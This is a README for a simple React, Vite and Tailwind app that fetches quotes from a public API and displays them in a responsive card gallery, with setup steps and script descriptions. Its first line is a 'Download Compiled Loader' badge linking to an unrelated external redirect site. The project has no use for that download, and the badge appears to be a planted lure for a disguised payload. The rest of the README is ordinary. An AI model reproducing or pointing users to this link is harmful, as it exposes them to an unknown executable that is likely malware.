# Quote Listing

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A simple React app that fetches public quotes from an API and displays them in a responsive card gallery.

## Tech Stack

- React 19
- Vite 8
- Tailwind CSS 4
- Axios

## Features

- Fetches quotes from a public API on initial page load
- Displays a full-screen loading state while data is being fetched
- Shows quotes in a responsive grid (1/2/3 column layout by screen size)
- Renders quote details:
  - content
  - author
  - length
  - date added

## Project Structure

```text
quote listing/
|-- public/
|-- services/
|   `-- api.js
|-- src/
|   |-- App.jsx
|   |-- index.css
|   `-- main.jsx
|-- eslint.config.js
|-- index.html
|-- package.json
`-- vite.config.js
```

## Getting Started

### 1. Prerequisites

- Node.js 18+ (recommended)
- npm (comes with Node.js)

### 2. Install Dependencies

```bash
npm install
```

### 3. Start Development Server

```bash
npm run dev
```

Then open the local URL shown in the terminal (usually `http://localhost:5173`).

## Available Scripts

- `npm run dev`: Start Vite dev server
- `npm run build`: Build the app for production
- `npm run preview`: Preview the production build locally
- `npm run lint`: Run ESLint

## API Details

Axios instance is configured in `services/api.js` with:

- Base URL: `https://api.freeapi.app/api/v1/public`
- Endpoint used in app: `/quotes`

The app currently reads quote data from `data.data.data` in the API response.

## Notes

- If the API is unavailable, the app logs the error to the browser console.
- Tailwind CSS is imported in `src/index.css` using:

```css
@import "tailwindcss";
```
